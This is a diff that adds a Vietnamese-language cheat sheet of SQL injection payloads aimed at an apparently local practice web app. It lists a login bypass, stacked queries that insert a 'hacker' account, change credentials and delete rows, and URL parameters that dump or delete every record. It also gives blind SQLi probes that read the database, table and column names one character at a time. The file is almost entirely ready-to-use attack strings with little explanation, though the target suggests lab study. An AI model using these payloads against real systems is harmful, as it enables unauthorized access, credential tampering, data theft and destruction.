@@ -1,1 +1,43 @@
+Bỏ qua bước đăng nhập:
 ' OR '1'='1' -- 
+
+Thêm:
+' OR '1'='1'; INSERT INTO user (TenUser, Pass) VALUES ('hacker', 'hack123'); -- 
+
+Sửa:
+' OR 1=1; UPDATE user SET TenUser='duc', Pass='duc123' WHERE ID=1; -- 
+Xóa:
+' OR 1=1; DELETE FROM user WHERE ID = 6; -- 
+
+Xóa bằng link:
+http://localhost:3000/FormLoginAndWeb/delete.php?id=0 OR 1=1
+
+Đánh cắp dữ liệu bằng link:
+http://localhost:3000/FormLoginAndWeb/view.php?id=0 OR 1=1
+
+
+- Dùng Blind SQLi:
+
+Dò chữ cái đầu tiên của database:
+'  OR ('1'='1' AND SUBSTRING(database(),1,1)='s') -- 
+Dò chữ cái thứ 2 của database:
+'  OR ('1'='1' AND SUBSTRING(database(),2,1)='q') -- 
+...
+'  OR ('1'='1' AND SUBSTRING(database(),n,1)='s') --
+
+
+Dò chữ cái đầu tiên của bảng thứ nhất:
+' OR ('1'='1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='U') --
+Dò chữ cái thứ 2 của bảng thứ nhất:
+' OR ('1'='1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 2, 1)='U') --
+...
+Dò chữ cái đầu tiên của bảng thứ hai:
+' OR ('1'='1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)='A') --
+...
+
+
+Dò chữ cái đầu tiên của cột thứ nhất,hai,ba trong bảng user:
+' OR ('1'='1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 0,1), 1, 1) = 'I') -- 
+' OR ('1'='1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 1,1), 1, 1) = 'P') -- 
+' OR ('1'='1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 2,1), 1, 1) = 'T') -- 
+...
